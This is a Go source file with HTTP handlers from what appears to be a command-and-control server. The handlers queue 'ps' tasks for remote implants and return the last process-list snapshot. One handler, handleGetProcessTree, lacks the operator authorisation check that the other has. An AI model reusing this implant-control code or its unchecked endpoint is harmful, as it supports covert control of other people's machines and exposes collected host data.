package server

import (
	"net/http"

	"github.com/gin-gonic/gin"
)

// lastPSSnapshotEnvelope is the honest operator payload for GET process-tree.
// The implant aliases process_tree → ps; this is the last completed ps blob,
// not a live hierarchical process browser.
func lastPSSnapshotEnvelope(result string) gin.H {
	return gin.H{
		"processes": result,
		"source":    "ps",
		"live":      false,
		"kind":      "last_ps_snapshot",
		"alias_of":  "ps",
	}
}

// handleGetProcesses queues a ps task (not a live tree refresh).
func (s *Server) handleGetProcesses(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	agentID := c.Param("id")

	task, err := s.createTask(agentID, "ps", "", "", "", "", 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create ps task")
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"task_id": task.ID,
		"source":  "ps",
		"live":    false,
		"message": "Queued ps. This is not a live process tree; wait for the task result.",
	})
}

// handleGetProcessTree returns the last completed ps snapshot, not a live tree.
func (s *Server) handleGetProcessTree(c *gin.Context) {
	agentID := c.Param("id")

	var task struct {
		Result string
	}
	err := s.db.Table("tasks").
		Select("result").
		Where("agent_id = ? AND type = 'ps' AND status = 'completed'", agentID).
		Order("created_at desc").
		Limit(1).
		Scan(&task).Error

	if err != nil || task.Result == "" {
		respondError(c, http.StatusNotFound, "No completed ps snapshot. Queue ps first. This is not a live process tree.")
		return
	}

	c.JSON(http.StatusOK, lastPSSnapshotEnvelope(task.Result))
}
